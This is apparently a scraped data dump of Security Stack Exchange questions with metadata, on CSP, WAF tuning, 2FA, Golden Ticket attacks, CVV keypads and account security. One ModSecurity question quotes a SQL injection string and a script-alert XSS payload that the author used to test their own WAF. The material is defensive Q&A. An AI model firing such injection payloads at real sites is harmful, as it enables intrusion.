<li>The numbers are never in their normal order (1, 2, 3...).</li>
<li>The positions of the numbers are shuffled each time you open the CVV input panel.</li>
</ol>
<p>So my question is:</p>
<p><strong>Is there a point in making the numbers shuffled each time you want to input a CVV code?</strong></p>
<p>I understand that you might want to disable the keyboard input and use a mouse instead to defend from keyloggers, <em>but is there any point in making the positions of the numbers shuffled</em>?</p>
<p>I do also understand that this approach is a good idea on a touch display as it removes the posibility of guessing the pin by the fingerprints on the display, but the cursor does not leave any fingerprints behind.</p>
<p>And if this is made to defend from keylogers that also log your mouse clicks, is it actually effective, knowing that if the keylogger logs your mouse clicks, there is no reason it can not also make screenshots?</p>
","","user195617","6253","","2020-12-13 23:07:51","2020-12-13 23:11:38","Over-the-top (?) security practices for CVV inputs","<credit-card><banks><security-theater>","1","0","","","","CC BY-SA 4.0"
"173272","1","173276","","2017-11-11 16:10:21","","0","2024","<p>I'm using the following PHP script to test CSP policy,</p>

<pre><code>&lt;?php
   header(""Content-Security-Policy: default-src https:; report-uri /report.php"");
   header(""Content-Security-Policy: default-src 'self'"");
?&gt;

&lt;html&gt;
   &lt;body&gt;
        &lt;script src=""http://google/abc.js""&gt;&lt;/script&gt;
   &lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>The CSP policy works,</p>

<p><a href=""https://i.stack.imgur.com/LJDHm.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/LJDHm.jpg"" alt=""enter image description here""></a></p>

<p>But the <code>report-uri</code> part didn't. The reporting request was never sent and no relevant entry in nginx access logs</p>

<p>Any ideas?</p>
","10331","","10331","","2017-11-11 16:21:06","2017-11-11 16:55:02","CSP report-uri does not work","<content-security-policy>","1","3","","","","CC BY-SA 3.0"
"242193","1","","","2020-12-16 10:48:23","","1","117","<p>I'm looking at hardening our AD. One concern I have is around Golden Ticket Attacks using Mimikatz and the likes (<a href=""https://attack.stealthbits.com/how-golden-ticket-attack-works"" rel=""nofollow noreferrer"">https://attack.stealthbits.com/how-golden-ticket-attack-works</a>). One of the things that struck me about the attack is that it requires privileges on a DC. If you already have privileges on a DC, what's the point of the attack, why not just create a new domain admin?</p>
<p>What I am missing?</p>
<p>Thanks</p>
","162004","","","","","2020-12-16 10:48:23","How do you protect against Active Directory Golden Ticket Attacks?","<account-security><active-directory>","0","0","","","","CC BY-SA 4.0"
"173483","1","","","2017-11-14 17:52:43","","3","115","<p>Normally, content security policies are sent in the response headers by the server to the client browser telling it what is and is not acceptable to load on the site.  Is there a way to do this in reverse, so that you write a content security policy for your browser, for each site, and then it only loads the resources that are allowed by you on that particular site?  This would be possible if you wrote your own browser, but I am wondering if any of the current major browsers have this ability built in yet, without having to create or install a plugin.</p>
","108360","","108360","","2017-11-14 18:58:23","2017-12-14 22:01:15","Is it possible to specify a content security policy in browsers?","<web-browser><content-security-policy>","1","2","","","","CC BY-SA 3.0"
"173485","1","173487","","2017-11-14 18:24:38","","1","118","<p>My friend runs an office in which the computer used by the receptionist is used by so many people including my friend and others (so many people come there for job recruitment) who frequently save their passwords on browsers. </p>

<p>Today I was talking to the receptionist as we know each other very well and while discussing hacking, I told him how to view saved passwords on chrome and then realised my mistake. What do you think is the best way to secure password saved even accidentally on that pc so that the receptionist won't ever be able to view any of em?</p>

<p>Currently I have suggested him lastpass (although its more of a password manager, on first installation it removes all the unsafe passwords and even if any others are saved then makes them inaccessible by a master password).</p>
","163768","","","","","2017-11-14 18:32:36","How to secure mine as well as other people' passwords on the computer used by my receptionist?","<account-security><protection><safe-browsing-filter>","1","4","","","","CC BY-SA 3.0"
"242568","1","","","2020-12-26 06:07:37","","3","667","<p>I have installed ModSecurity in Apache server and using it as a reverse proxy to forward request to a NodeJS applicaiton.</p>
<p>I have followed this tutorial to configure ModSecurity in Apache, <a href=""https://www.atlantic.net/vps-hosting/securing-your-apache-web-server-with-mod-security/"" rel=""nofollow noreferrer"">https://www.atlantic.net/vps-hosting/securing-your-apache-web-server-with-mod-security/</a></p>
<p>I then enabled <code>SecRuleEngine</code> and set it value to <code>On</code>.</p>
<p>Upon starting Nodejs Application and Apache Server with ModSecurity I can see that requests are routed to NodeJs application.</p>
<p>However, the nodejs application is adding <code>#/</code> at the end of the domain i.e it becomes <code>http://test.com/#/</code></p>
<p><strong>SQLi</strong>
I tried performing SQLi by simply running <code>' or 1=1; --</code> for Username in a login field. Which is blocked by ModSecurity and I get Forbidden page.</p>
<p><strong>XSS</strong></p>
<p>When I visit,</p>
<pre><code>http://test.com/#/%3Cscript%3Ealert(%E2%80%98XSS%E2%80%99)%3C/script%3E
</code></pre>
<p>ModSecurity doesn't block it, However If I remove <code>#/</code> and visit</p>
<pre><code>http://test.com/%3Cscript%3Ealert(%E2%80%98XSS%E2%80%99)%3C/script%3E
</code></pre>
<p>ModSecurity blocks it.</p>
<p>Can someone please help me understanding how to use modsecurity when NodeJS adds <code>#/</code> in url?</p>
","247962","","","","","2020-12-26 06:39:49","ModSecurity - XSS not blocked when #/ (hash) is added in the url by NodeJS application","<xss><mod-security>","1","0","","","","CC BY-SA 4.0"
"33411","1","33419","","2013-03-29 23:54:40","","14","18285","<p>When I turn my notebook on, it asks me for the password to unlock the BIOS and than it asks me for the password to unlock the hard drive. </p>

<p>How different is this 'password to unlock the hard drive' from the so-called full-disk encryption in terms of offered protection? </p>

<p>If someone could reset the BIOS (which is said to be easy even if password protection) given that this hard drive password was itself set in the BIOS, wouldn't the person have access to the drive? I'm not sure that this lock means encrypting.</p>

<p>Because if it works as Xander suggest then it makes the whole discussion about what software to use in full-disk encryption seem silly, since the solution is as trivial as setting a password in the BIOS.</p>

<p>I'm confused. :)</p>
","4980","","66423","","2023-08-24 14:40:25","2023-08-24 14:40:25","Unlock hard drive vs full-disk encryption","<encryption><disk-encryption><bios><ata-security>","4","1","","","","CC BY-SA 3.0"
"242674","1","","","2020-12-29 08:05:23","","2","1590","<p>I'm evaluating a CSP policy using <a href=""https://csp-evaluator.withgoogle.com/"" rel=""nofollow noreferrer"">https://csp-evaluator.withgoogle.com/</a>. The policy is configured as follow:</p>
<pre><code>default-src 'self';object-src 'self';script-src 'self' 'unsafe-inline' 'unsafe-eval';script-src-elem 'self' 'unsafe-inline' 'unsafe-eval';script-src-attr 'self' 'unsafe-inline';
</code></pre>
<p>Why only <code>'unsafe-inline'</code> of <code>'script-src'</code> is reported as a high severity finding? From what I understood also <code>'script-src-elem' 'unsafe-inline'</code> could be dangerous. What am I missing?</p>
","188823","","47524","","2020-12-29 11:43:00","2021-01-02 10:18:58","Why only script-src unsafe-inline is reported as a high severity finding?","<content-security-policy>","2","0","","","","CC BY-SA 4.0"
"242712","1","","","2020-12-30 03:09:17","","1","189","<p>I was thinking about zero-trust systems over the last few weeks and it seems like there are many things that could be implemented that way. With password managers being one of those things, I was curious about designing something like google sign-in as a zero-trust account/authentication system.</p>
<p>Let's call such a system &quot;MyAuth&quot; to make it easier to talk about it.</p>
<p>First of all, here are some requirements I have for MyAuth:</p>
<ol>
<li>Zero-Trust: It should not be possible for anyone from MyAuth to login as an MyAuth user on any of the registered 3rd party services.
Note (1.a): I wanted to add that it should not be possible for anyone from MyAuth to see which services I am using or talking to, but I could not think of a way to do that in a way that it cooperates with requirement (3).
Note (1.b): This implies that all 3rdParty Services need a way of authentication. MyAuth is not a replacement for that like it is with google sign-in.</li>
<li>Data Breaches: For a 3rd party service, anyone with readonly access to the database must not be able to login with my user on that service and they should not be able to get any information on my MyAuthId or MyAuth credentials.</li>
<li>Additional/Default Security: Whenever I want to login to a 3rd party service I also have to authenticate my access to this login via my MyAuth account.
Note (3.a): This guarantees a basic level of security, the security of my MyAuth-account itself.</li>
<li>Login Attempts: I want to see each login attempt from a yet unauthorized device on any of the 3rdParty services I use.</li>
</ol>
<p>That said, I think I have a design for these things. I think the design could be tweaked a little but I will get to that after I present it.</p>
<p>Assuming I already have a zero-trust data service MyAuth0 which can store data and send messages between the server and the client. This means MyAuth0 can not read the data stored in my vault because I have a secret that is used to calculate the login password and the encryption key for the data and the encryption key cannot be calculated from the login password.</p>
<p>Registration:</p>
<ol>
<li>Me-&gt;MyAuth:   I would like some login tokens to use with other services please</li>
<li>MyAuth-&gt;Me:   Sure thing, here are some tokens. You will need an active session to get an authentication request.
2.5. Me: Stores logins in the vault to be used in the future</li>
<li>Me: pressing &quot;sign-up with MyAuth&quot;, which opens an MyAuth dialog. Logging in and selecting an unused login-token I would like to use for the sign-up process.</li>
<li>Me (session x on device z)-&gt;3rdParty:   I would like to register on your Service using MyAuth and this login token please. We will be communicating over MyAuth in the future, so let us use a zero knowledge proof based authentication mechanism. Here, this is something you can use to test whether I know my secret, just generate as many questions as you think are sufficient and send them with your MyAuth authentication reqeust in the future.</li>
<li>Me: Stores my secret and the login token in my vault in a way that I know which secret is needed if the server wants to authenticate the login token in the future, add a timestamp to the login token so I can differentiate between multiple accounts on the same 3rdParty App, might add a label manually later.</li>
<li>3rdParty-&gt;MyAuth: Hello, could you please authenticate that this login token can be used from this device and can you forward this message here? Thanks. (Message contains challenges)</li>
<li>MyAuth-&gt;Me (on any active session): Hey, someone wants to verify that you are using this login token from the following device, is that correct? Oh, here is a message from them.</li>
<li>Me (from any active session)-&gt;MyAuth: Yes, can you please send them this message back? (message contains the solved challenges)</li>
<li>MyAuth-&gt;3rdParty: Okay, the login token may be used for the device this time, here is a message from the user.</li>
<li>3rdParty: Checks whether the responses match with what was expected</li>
<li>3rdParty-&gt;Me (session x on device z): looks good, here we go.</li>
</ol>
<p>Login:</p>
<ol start=""0"">
<li>Me: pressing &quot;login with MyAuth&quot;, which opens an MyAuth dialog. Logging in and selecting the login-token I would like to use.</li>
<li>Me (session x on device z)-&gt;3rdParty:   I would like to log into your Service using MyAuth and this login token please.</li>
<li>3rdParty-&gt;MyAuth: Hello, could you please authenticate that this login token can be used from this device and can you forward this message here? Thanks. (Message contains challenges)</li>
<li>MyAuth-&gt;Me (on any active session): Hey, someone wants to verify that you are using this login token from the following device, is that correct? Oh, here is a message from them.</li>
<li>Me (from any active session)-&gt;MyAuth: (Clicks ok) Yes, can you please send them this message back? (message contains the solved challenges)</li>
<li>MyAuth-&gt;3rdParty: Okay, the login token may be used for the device this time, here is a message from the user.</li>
<li>3rdParty: Checks whether the responses match with what was expected</li>
<li>3rdParty-&gt;Me (session x on device z): looks good, here we go.</li>
</ol>
<p>The design could be tweaked a little as I said. I would also like to add the feature that MyAuth can't read the messages between the server and me. I think it would be possible to implement the  communication protocol from signal. This got a little over my head but I think it would also add additional defence against someone from MyAuth trying to log in to a 3rdParty application if they know the secret I use for the zero-knowledge proof and if they have write access to the MyAuth database.</p>
<p>If this communication encryption is not present, someone from MyAuth with write permissions could change the MyAuthId related to the login token to theirs and store the secret to the 3rdParty service there. On request they can then calculate the challenges. With the encryption in place they would need yet another piece of the puzzle and it would make it harder to get the other piece in the first place.</p>
<p>I would love to hear your opinion regarding usability, security and feasibility of this as a real-world application. Are there any security holes in the design itself? Are there any unnecessary security features that are just security by obscurity?</p>
","248179","","37315","","2020-12-30 08:49:31","2020-12-30 08:49:31","Zero-Trust alternative to google sign-in, is this a feasable design?","<authentication><account-security><oauth2><internet><zero-trust>","0","4","","","","CC BY-SA 4.0"
"173830","1","173832","","2017-11-19 09:00:58","","3","166","<p>Facebook uses two-step authentication or <a href=""https://www.facebook.com/notes/facebook-engineering/introducing-login-approvals/10150172618258920/"" rel=""nofollow noreferrer"">""login approval""</a>, which means that <strong>all unrecognized devices</strong> will have to enter a code received through SMS. Suppose my Samsung device is the only device that has been logged in to my Facebook account. <strong>What must the attacker do</strong> so that:</p>

<ul>
<li>I won't receive any SMS (or at least won't see any)</li>
<li>I don't receive any e-mail about that</li>
<li>The attacker gains access to my account and can view messages/be active (liking, commenting)</li>
</ul>

<p><em>What is the most realistic and possible scenario?</em> </p>
","69067","","113729","","2017-12-04 10:32:23","2017-12-04 10:32:23","How can an account be accessed even though two-step authentication?","<mobile><multi-factor><account-security><facebook>","1","0","","","","CC BY-SA 3.0"
"173943","1","","","2017-11-20 18:34:51","","2","565","<p>Security Theater, or Security Theatre in British English, has been mentioned in many <a href=""https://security.stackexchange.com/questions/tagged/security-theater"">posts</a> on this site.</p>

<p>What does Security Theater mean? </p>

<p>What are some examples?</p>

<p>Is it the greatest threat to actual security?</p>
","149193","","149193","","2017-11-20 19:02:07","2017-12-27 23:33:24","What is Security Theater?","<security-theater>","3","5","","","","CC BY-SA 3.0"
"173953","1","","","2017-11-20 20:58:57","","-1","188","<p>I have <strong>Google Acc 0</strong> (GAO) mostly for bank porpoises and some ""official"" services. This email basically ""surname.name@google.com"" and I put in my old C.V. and some other contact information.
When I got Android phone I decided to crate <strong>Google Acc 1</strong> (GAN)
I redirected mail from some other mailboxes that I was still using, to it, and put GAO as recovery account for GAN, I am using GAN at the moment as my official contact mail. Also added GAO to mail in my phone. Protected both with 2FA - google code generator on my phone and set my phone number as recovery number.
Also I am using LastPass, which is also dependent on 2FA on phone and its phone number, LastPass account is mail of GAN and its also stores password to that mail so I can easily access to it from PC because I usually using other (not GAO) account on PC and need to use this one rarely.</p>

<p>At this point I understood that something is wrong. My mind get tangled and I decided to draw relationships diagram (below) where arrows mostly represents dependencies (except gathering mail) i.e.</p>

<p><a href=""https://i.stack.imgur.com/eQwSe.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/eQwSe.png"" alt=""enter image description here""></a></p>
","164123","","109028","","2017-11-21 08:45:40","2017-12-23 10:00:04","What is optimal way to connect accounts to 2FA on phone?","<password-management><password-policy><multi-factor><account-security>","1","2","","","","CC BY-SA 3.0"
"174033","1","","","2017-11-21 20:31:13","","0","1566","<p>Mathematically, how much more secure is fingerprint compared to textual passwords? Like is there any detailed mathematical analysis?</p>
","164328","","","","","2017-11-22 02:10:34","How much more secure is fingerprint compared to text passwords?","<account-security><biometrics><fingerprint>","1","4","","2017-11-22 07:37:59","","CC BY-SA 3.0"
"174072","1","174075","","2017-11-22 11:11:13","","2","552","<p>I have a basic Java Server program on my iMac written entirely in Java, which works for a Java client drawing program. </p>

<p>The program basically enables a user to draw something on the JPanel with the drawing being copied onto the panels of all the connected clients.</p>

<p>The server works on a static ip address, over multiple optional ports and involves the use of databases and iMac’s filesystem.</p>

<p>The problem:
<strong>I am receiving random connection requests from strange Ip addresses all the time and I am am really suspicious about it</strong></p>

<p>Please have a look at my sample server code:</p>

<p><a href=""https://stackoverflow.com/questions/47307797/what-is-the-most-secure-way-to-write-a-java-server-program-which-listens-on-my-s"">https://stackoverflow.com/questions/47307797/what-is-the-most-secure-way-to-write-a-java-server-program-which-listens-on-my-s</a></p>

<p>Questions)
1) Can hackers compromise my iMac because of my naive server program? If so, what should I modify in my code to prevent it?</p>

<p>2) What mechanisms in my code are the weak links?</p>

<p>3) Is it possible for a hacker to access my iMac just by knowing the static ip?</p>

<p>Thanks</p>
","164371","","","","","2017-11-22 11:44:23","How to make my basic Java Server secure against hackers?","<network><malware><java><server><account-security>","1","0","","2017-11-22 22:15:56","","CC BY-SA 3.0"
"174187","1","174192","","2017-11-23 19:11:31","","0","109","<p>I am reading this <a href=""https://whitton.io/articles/uber-turning-self-xss-into-good-xss/"" rel=""nofollow noreferrer"">blog post</a> about an vulnerability on uber.com. It says that you will have to set a content security policy:</p>

<blockquote>
  <p>We’ll set our policy to only allow requests to  partners.uber.com, which will block <code>https://login.uber.com/logout/*</code> Hence a 302 redirect to <code>https://login.uber.com/logout/</code> will be prevented.</p>
</blockquote>

<p>But how can I change the CSP policy of a website I have no control of? The Website Uber is not mine and the author has listed code below showing HTML and Javascript to use. But where should I put the code? I am not allowed to enter HTML or JavaScript, right?</p>
","164474","","98538","","2017-11-23 21:04:26","2017-11-23 21:07:27","How to perform attack that requires me to set a CSP on a site I do not control?","<web-application><xss><content-security-policy>","1","1","","","","CC BY-SA 3.0"
"33724","1","","","2013-04-04 07:38:28","","21","11033","<p>We have a Drupal application developed for sharing files.</p>

<ol>
<li>We are allowing zip files to be uploaded by logged in departmental user.</li>
<li>We are using Drupal private file system (outside webroot).</li>
<li>We are using php Fileinfo for validation.</li>
<li>Only logged in user will be able to download the file.</li>
</ol>

<p>Now our security team is not allowing zip uploads saying it is a threat. I want to know the security threats by having this feature and what can I do to prevent it.</p>
","24272","","24272","","2013-04-04 12:47:50","2013-10-14 10:30:52","What are the security threats of zip file uploads and what preventive actions should be taken?","<php><file-upload><security-theater><drupal><zip>","4","4","","","","CC BY-SA 3.0"
"33768","1","33772","","2013-04-05 05:41:04","","24","1172","<p>I clearly understand that the security seals (verisign or norton secure etc.) shown on banking and other websites are generated using a script and available only after an ssl certificate is purchased and installed.</p>

<p>The certificate vendors say ""the seal helps improve your customers' perception of safety and trust""</p>

<p>I just somehow can not convince myself with this idea of 'perception of safety'.</p>

<ol>
<li>No user is going to click the seal every time to see if it is really a seal by verisign.Most users will be unaware of this feature.</li>
<li>The image can easily faked for on a phishing site.</li>
<li>The vendors claim that it is a protection mechanism against phishing and Identity theft.</li>
</ol>
","21234","","21234","","2016-11-30 11:58:40","2016-11-30 11:58:40","Security seals and the ""perception of safety""?","<phishing><trust><security-theater><security-seal>","4","3","","","","CC BY-SA 3.0"
"243044","1","","","2021-01-08 11:56:24","","-1","168","<p>New <em><strong>WhatsApp</strong> data privacy update</em>, that it will share our data with <strong>Facebook</strong>, we all know Facebook owns WhatsApp and this is obvious Facebook can always access users of WhatsApp as well. So why to ask from us even if they can do it and we won't even complaint against it?
And what if Facebook access WhatsApp users data, who is responsible to check source code of these apps?</p>
","227173","","","","","2021-02-01 12:50:56","Following the new WhatsApp data privacy update, why does WhatsApp ask from users, even if they didn't, who is going to check their source code?","<privacy><account-security><facebook><whatsapp>","1","1","","","","CC BY-SA 4.0"
"174228","1","176163","","2017-11-24 12:36:06","","4","274","<p>I have just tested <a href=""https://www.google.com"" rel=""nofollow noreferrer"">google</a> on <a href=""https://securityheaders.io"" rel=""nofollow noreferrer"">securityheaders.io</a> and the result was <a href=""https://securityheaders.io/?q=https%3A%2F%2Fwww.google.com%2F"" rel=""nofollow noreferrer"">D</a>. </p>

<p>Google is actually not setting following security headers</p>

<ul>
<li>Content-Security-Policy</li>
<li>X-Content-Type-Options</li>
<li>Referrer-Policy</li>
</ul>

<p>I always considered Google as leader in many security areas. The above headers are part of usual defence in depth practice. </p>

<p>Could anybody provide some rationale behind this? Why google is not implementing them?</p>
","39536","","","","","2017-12-27 00:13:21","Poor result on securityheaders.io for google.com","<xss><content-security-policy>","1","5","","","","CC BY-SA 3.0"
"243107","1","","","2021-01-09 19:53:09","","0","111","<p>First off, I'm not even sure if this question belongs on this site, but I am a programmer and I usually just ask stack overflow questions like this, and I know for a fact this one doesn't belong there.</p>
<p>But basically, my question is if I get a flash drive, and only ever attach it to say a Raspberry pi 0 (the one without internet connectivity), and put information that I really don't want people to get their hands on (like for example, social security number), would that basically be as secure as just having it written on a sheet of paper?</p>
<p>Because I don't super want it written down because I feel like if someone breaks in or something, it would be a lot easier to determine what it was if it was written down on a piece of paper, but at the same time I don't want to put that information on anything that connects to the internet on the tiny off chance that the device gets compromised.</p>
<p>sorry if this question doesn't really fit this website, but if it doesn't I would appreciate someone being able to point me to somewhere where it would fit.</p>
","248762","","","","","2021-01-09 20:15:19","Would putting important information on a flash drive that never touches the internet be secure?","<internet><usb-drive><raspberry-pi><isolation><social-security-number>","1","1","","","","CC BY-SA 4.0"
"174357","1","","","2017-11-26 16:11:24","","0","235","<p>It's a well known fact that phones, computers and other devices can be tracked and be used as a means of collecting user information if the situation permits it, for example in crime investigations. I don't know exactly how this is done, what technical methods that are used and one could think whether it's built-in back doors that are used or just a brute-force approach. </p>

<p>I think it's good to know in terms of personal data security and the ever growing demand for total control slowly becoming a reality which can be witnessed today in some parts of the world. </p>

<p>This is not about any laws because I'm well aware of the laws regarding this subject. What I didn't find information about is how someone can collect data or track a device without any limit distance-wise and to what extent this data collecting can occur without getting further help from other sources, for example if the suspicious person leaves the region/country.  </p>

<p>When authorities tracks down criminals or gathers data for a case, is their method of retrieving this information only dependent on one source with complete access or do they contact various of different sources to help them achieve this? <strong>Can anyone with enough knowledge use the these same methods or do they require certain accessibility that goes beyond that of an ordinary citizen?</strong></p>

<p>Thank you in advance. </p>
","164391","","","","","2017-11-27 23:31:02","The requirements of gathering information data without any limits?","<network><databases><vulnerability><account-security><information-gathering>","2","0","","2017-11-29 13:02:17","","CC BY-SA 3.0"
"243234","1","","","2021-01-12 14:56:15","","1","390","<p>Here is an extract from a CSP report</p>
<pre><code>[csp-report] =&gt; Array
    (
        [blocked-uri] =&gt; chrome-extension
        [column-number] =&gt; 27329
        [document-uri] =&gt; https://www.mysite.com/mypage/
        [line-number] =&gt; 3
        [referrer] =&gt; https://www.google.com/
        [source-file] =&gt; https://www.mysite.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp
        [violated-directive] =&gt; font-src
    )
</code></pre>
<p>Here is the list of font sources that are legitimate (according to the policy):</p>
<pre><code>'self'
code.ionicframework.com
data:
fonts.googleapis.com
fonts.gstatic.com
http://use.fontawesome.com
https://use.fontawesome.com
</code></pre>
<p>I am trying to understand what happened that gave rise to the CSP policy violation.
I note, too, that when I visit the page concerned, everything appears normal and no violation of the policy occurs.</p>
<p>So, here is how I interpret the report, but I am not at all sure of my interpretation. So I am asking for help in understanding it.</p>
<ol>
<li>A visitor is referred to mypage having found it via a Google search.</li>
<li>The visitor performs some manipulation that triggers a call to a function in wp-includes/js/jquery/jquery.js?ver=1.12.4-wp (it is a WordPress site, as you might guess)</li>
<li>That function attempts to load a font from a source that is not allowed as per my policy (I do not display the policy here, for reasons of confidentiality)</li>
<li>The CSP font-src policy blocks the loading of the font and generates the report above (redacted).</li>
</ol>
<p>Questions:</p>
<ol>
<li>Is my understanding of the events correct?</li>
<li>Why is the blocked uri called &quot;chrome-extension&quot;? Does this imply that the font source is expected to be local to the server? Or local to the client?</li>
<li>If, for some reason, I wanted to change the policy accept whatever font was attempted to be loaded, how would I do that, given that chrome-extension is not a valid entry to the list of sources?</li>
</ol>
","248937","","6253","","2021-01-12 14:58:21","2021-01-12 14:58:21","chrome-extension as source of CSP policy violation","<content-security-policy>","0","1","","","","CC BY-SA 4.0"
"243261","1","","","2021-01-13 06:58:20","","1","75","<p>I'm working on a resource-constraint product and asked to enable support for MFA/2FA for all maintenance services. Given that MFA/2FA is about using two elements out of three(<strong>something you have, know, are</strong>). Our maintenance application is a desktop windows-forms application running over HTTPS protocol to interact with the product.</p>
<p>I'm just thinking about a model of using two-factor authentication to be pushed to the maintainer's laptop/desktop as the product is resource constraint(no display/usb/ssh etc). As the product is to be installed in an enterprise setup, It is possible to enforce 2FA/MFA easily for the laptops/desktops to log into the enterprise network by <strong>using a combination of password and certificate</strong>. Also, the Organisation may enforce LDAP and/or 802.1x(PNAC) for authentication or AAA(AuthN, AuthZ, and Audit) service.</p>
<p>By doing this, I will be able to retain the existing product's software as is which only performs <strong>single-factor authentication using the password.</strong> Also, the product is not internet-facing.</p>
<p>Is this the right approach or does it expose any security risk? Please suggest to me.</p>
","247172","","","","","2021-01-13 06:58:20","2FA/MFA in a resource-constraint product","<authentication><account-security><multi-factor>","0","0","","","","CC BY-SA 4.0"
"243281","1","243284","","2021-01-13 16:32:25","","0","115","<p>I have come across many security keys from different manufacturers such as solokeys, yubico etc.., for the purposes of 2FA/MFA. Products vary basically w.r.t features such as USB-A, USB-C, Apple connector or NFC. But, I could not still figure out the reason for having a push button in couple of products whereas the nano products do not have that push button. So, does the push button offer extra security in any manner? or if the push button is not available, is the key open to security risks?</p>
","247172","","","","","2021-01-13 17:19:28","Push button in Security key used for 2FA/MFA","<account-security><multi-factor>","1","0","","","","CC BY-SA 4.0"
"174473","1","","","2017-11-27 23:42:15","","2","2047","<p>It seems like Gmail isn't logging full account activity. Recently I had my online account to Paxful hacked.</p>

<p>Today, 11/27 at 5:07, I received an email from Paxful saying that someone requested a password reset link, and at 5:08, another saying that my password had been reset from an IP address registered to a company in Amsterdam, but showing a geolocation in Chicago (149.255.33.155), implying they had clicked on the email link. </p>

<p>I then accessed my detailed Gmail recent account activity, and there were no logs of logins to my Gmail account during that time, 100% positive.</p>

<p>How is this possible? There's no way to reset the password outside of accessing the email. Doesn't Gmail log activity?</p>

<p>Paxful email header:</p>

<pre><code>Message ID &lt;43fc6021b7f399e7e456ef41e6291a92@paxful.com&gt; 
Created at: Mon, Nov 27, 2017 at 5:07 PM (Delivered after 28 seconds) 
From: Paxful &lt;help@paxful.com&gt; 
To: (hidden)@gmail.com 
Subject: Password reset at Paxful 
SPF: TEMPERROR with IP 184.173.153.56 Learn more 
DKIM: 'PASS' with domain paxful.com Learn more 
DMARC: 'PASS' Learn more
</code></pre>
","164777","","6253","","2017-11-28 09:31:50","2017-11-28 14:34:07","Gmail not logging account activity","<email><account-security><gmail>","3","7","","","","CC BY-SA 3.0"
"243364","1","244839","","2021-01-15 16:00:17","","0","1646","<p>I have a requirement to add security between service to API communication. The current implementation is client certificates. The client gets a certificate and just sends it in a cookie to the API. API does zero verification of the certificate. It pretty much is &quot;just there&quot; in the cookie.</p>
<p>The reason is they are concerned with additional overhead in any server validation as they need calls to be instantaneous. 3 seconds is too long. Think stock trades. Calls need to be real-time and instant.</p>
<p>So would implementing something like an OAuth JWT token and validating it on the API server add additional overhead that will slow down a transaction?</p>
<p>What about an API gateway? Does that also introduce additional overhead?</p>
<p>I'm looking for the fastest available solution that will not increase processing time but I can also validate incoming requests on the server.</p>
","249116","","91193","","2021-01-15 16:35:19","2021-02-15 07:03:12","Is there any additional overhead over using Oauth vs Client Certificates?","<certificates><account-security><authorization><oauth2><api-gateway>","2","0","","","","CC BY-SA 4.0"
"243440","1","243445","","2021-01-17 21:16:16","","3","170","<p>I've found a very similar question: <a href=""https://security.stackexchange.com/questions/150817/should-users-be-allowed-to-login-with-the-same-password-when-a-password-change-i"">Should users be allowed to log in with the same password when a password change is requested but not changed?</a>. But the key difference here is that requesting an email change can only be done when someone is logged in, whereas a password change (through the &quot;forgot password&quot; flow) can be done even when someone is logged out. It'd therefore be impossible to lock someone else out of their account if a login was not allowed while the new email hasn't been verified yet.</p>
<p>With that in mind, during the period between the email change request and the new email being verified, should log in with the old email be permitted (assuming that the email represents the username)?</p>
","237132","","91193","","2021-01-18 08:57:41","2021-01-18 08:57:41","Should users be allowed to to login with the same email when an email change is requested but not completed?","<email><account-security><access-control>","1","0","","","","CC BY-SA 4.0"
"34239","1","","","2013-04-12 12:55:38","","-3","211","<p>Does a Virtual Private Network (VPN) provide an encrypted connection from outside networks or from ISPs to the internal network?</p>
","24694","","15577","","2013-04-12 13:50:08","2013-04-12 13:50:08","Why should I use the VPN?","<passwords><network><windows><international><security-seal>","1","2","","2013-04-13 19:41:05","","CC BY-SA 3.0"
"243520","1","243533","","2021-01-19 09:24:28","","0","191","<p>I am doing some background research into types of XSS and prevention and as I understand it there is not much any application can do against a universal XSS in a plugin or browser.</p>
<p>A last line of defense for XSS vulnerabilities is a good content security policy header set. It won't get rid of the underlying vulnerability but prevents an attacker from effectively exploiting it. For example, the following policy only loads scripts from the same origin as the webpage:</p>
<p><code>Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'none'; </code></p>
<p>As this is browser-based protection for a web application, I would think it would not mitigate any risk from a universal XSS as it affects the browser and so could bypass the protections. This leaves the only real mitigation for universal XSS as ensuring your browser and plugins are up to date.</p>
<p>Am I correct in my thinking? Appreciate any input.</p>
","249338","","91193","","2021-01-19 10:54:08","2021-01-25 16:15:50","Does an effective Content Security Policy mitigate a universal cross-site scripting vulnerability?","<web-browser><xss><vulnerability><content-security-policy><browser-extensions>","2","3","","","","CC BY-SA 4.0"
"174684","1","174719","","2017-11-30 21:40:48","","2","176","<p>I'm currently trying to implement a third-party widget into my website. That widget attempts to load some scripts over http, which is currently disallowed by my content security policy.</p>

<p>I'm concerned that setting the CSP to allow a script loaded over http would enable a man in the middle attack. The offending widget is on the login page, among other places, so an injected malicious script could easily steal someone's password.</p>

<p>Practically speaking, how concerned should I be about this? Should I enforce https-only script-src in my CSP?</p>
","165076","","","","","2017-12-01 11:56:08","Should I allow http script sources in my CSP, or enforce https only?","<man-in-the-middle><content-security-policy>","1","2","","","","CC BY-SA 3.0"
"107059","1","107193","","2015-12-02 15:25:54","","3","222","<p>The security elements of the <a href=""https://en.wikipedia.org/wiki/Parkerian_Hexad"" rel=""nofollow"">Parkerian Hexad</a> are:</p>

<pre><code>Confidentiality
Possession or Control
Integrity
Authenticity
Availability
Utility
</code></pre>

<p>Where do access controls (mandatory, discretionary and ACL) fit in?</p>
","91764","","","","","2015-12-03 19:39:17","Where do Access Controls Fit into the Parkerian Hexad?","<access-control><content-security-policy><mandatory-access-control>","2","2","","","","CC BY-SA 3.0"
"243594","1","","","2021-01-20 15:15:19","","0","94","<p>It comes to my mind a security problem that I would have accessing some data. My current problem is the following:</p>
<ol>
<li>There is a server in AWS London where you can access some data,
by law, that data should be accessible only by Europe.</li>
<li>I want to access that data being in Brazil physically but operationally
talking in Europe.</li>
<li>I want to avoid at all cost data that could be stolen or seen by a third party.</li>
</ol>
<p>My question is this:</p>
<p>Is it secure that I could for example create an AWS server in Frankfurt let's say, connect it from Brazil via ssh and from there connect to London's server. Legally will be Europe, technically is possible, my question is, how secure could this be? or for example create a GCP instance and access it to the web console/shell to ssh my server and from it connect to the one in Frankfurt?</p>
<p>I'm very unsure what could be like a &quot;really&quot; secure option given these circumstances. Is there a really secure way to do it? even if I connect to a computer in Frankfurt via a remote desktop or ssh tunnel and later connect to the server I will have the same problem?</p>
<p>Ideas?</p>
